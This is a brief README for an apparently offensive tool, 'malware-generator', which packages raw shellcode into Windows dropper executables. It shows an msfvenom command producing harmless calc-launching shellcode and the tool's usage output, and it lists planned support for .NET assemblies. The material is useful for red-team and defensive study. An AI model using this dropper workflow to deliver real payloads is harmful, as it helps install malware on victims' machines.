# malware-generator

Simple project to generate 32bit or 64bit droppers

# Usage

Create raw 64bit or 32bit shellcode with any tool you like here i will use msfvenom calc 64bit shellcode
```
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin
```

Then use my tool to generate a dropper for it
```
# ./generator.py calc.bin 
[*] Generating x64 Dropper for calc.bin
[+] Executable saved to output/calc.exe
```


## Todo
* add option to generate direct from msfvenom.
* add option to pass .NET assemblies and use donut.
